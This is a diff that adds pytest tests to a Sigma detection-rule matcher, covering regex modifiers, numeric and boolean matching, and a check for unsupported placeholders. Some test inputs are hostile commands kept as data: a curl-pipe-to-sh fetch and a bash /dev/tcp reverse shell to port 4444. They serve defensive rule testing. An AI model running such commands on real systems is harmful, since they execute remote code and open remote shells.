@@ -6,7 +6,7 @@ import pytest
 from sigma.rule import SigmaRule
 
 from ayudas import regla_desde
-from detectionlab.matcher import ErrorMatcher, _compilar, coincide
+from detectionlab.matcher import ErrorMatcher, _compilar, coincide, revisar_soporte
 from detectionlab.reglas import Regla
 
 
@@ -145,6 +145,56 @@ class TestModificadores:
         regla = regla_desde("  kw:\n    - 'FAILED su'\n  condition: kw\n")
         assert _coincide(regla, full_log="Nov 10 su[1]: FAILED su for root by www-data")
         assert not _coincide(regla, full_log="Nov 10 su[1]: (to root) dani on pts/1")
+
+    def test_palabra_clave_con_regex(self) -> None:
+        regla = regla_desde("  kw:\n    '|re': 'FAILED\\s+su'\n  condition: kw\n")
+        assert _coincide(regla, full_log="su[1]: FAILED   su for root")
+        assert not _coincide(regla, full_log="su[1]: session opened for dani")
+
+    def test_palabra_clave_numerica(self) -> None:
+        regla = regla_desde("  kw:\n    - 4444\n  condition: kw\n")
+        assert _coincide(regla, puerto="4444")
+        assert not _coincide(regla, puerto="22")
+
+    def test_regex_multilinea_y_dotall(self) -> None:
+        multilinea = regla_desde("  sel:\n    cmd|re|m: '^curl '\n  condition: sel\n")
+        assert _coincide(multilinea, cmd="set -e\ncurl http://x/y | sh")
+        assert not _coincide(multilinea, cmd="echo 'curl ' no ejecuta")
+        dotall = regla_desde("  sel:\n    cmd|re|s: 'bash.*tcp'\n  condition: sel\n")
+        assert _coincide(dotall, cmd="bash -i\n>& /dev/tcp/1.2.3.4/4444")
+        sin_dotall = regla_desde("  sel:\n    cmd|re: 'bash.*tcp'\n  condition: sel\n")
+        assert not _coincide(sin_dotall, cmd="bash -i\n>& /dev/tcp/1.2.3.4/4444")
+
+    def test_comparacion_con_decimal_en_texto(self) -> None:
+        regla = regla_desde("  sel:\n    carga|gt: 1.5\n  condition: sel\n")
+        assert _coincide(regla, carga="2.0")
+        assert not _coincide(regla, carga="1.0")
+
+    def test_booleano_desde_texto_negativo_y_entero(self) -> None:
+        falso = regla_desde("  sel:\n    syn: false\n  condition: sel\n")
+        assert _coincide(falso, syn="no")
+        assert not _coincide(falso, syn="true")
+        verdadero = regla_desde("  sel:\n    syn: true\n  condition: sel\n")
+        assert _coincide(verdadero, syn=1)
+        assert not _coincide(verdadero, syn="quizas")
+
+
+class TestSoporteMotor:
+    def test_regla_normal_sin_problemas(self) -> None:
+        regla = regla_desde("  sel:\n    exe: '/bin/sh'\n  condition: sel\n")
+        assert isinstance(regla.sigma, SigmaRule)
+        assert revisar_soporte(regla.sigma) == []
+
+    def test_placeholder_sin_expandir_se_reporta(self) -> None:
+        regla = regla_desde("  sel:\n    cmd|expand: '%ruta%'\n  condition: sel\n")
+        assert isinstance(regla.sigma, SigmaRule)
+        problemas = revisar_soporte(regla.sigma)
+        assert problemas == ["placeholder sin expandir: %ruta%"]
+
+    def test_expansion_windash_esta_soportada(self) -> None:
+        regla = regla_desde("  sel:\n    cmd|windash|contains: '-foo'\n  condition: sel\n")
+        assert isinstance(regla.sigma, SigmaRule)
+        assert revisar_soporte(regla.sigma) == []
 
 
 class TestCondiciones:
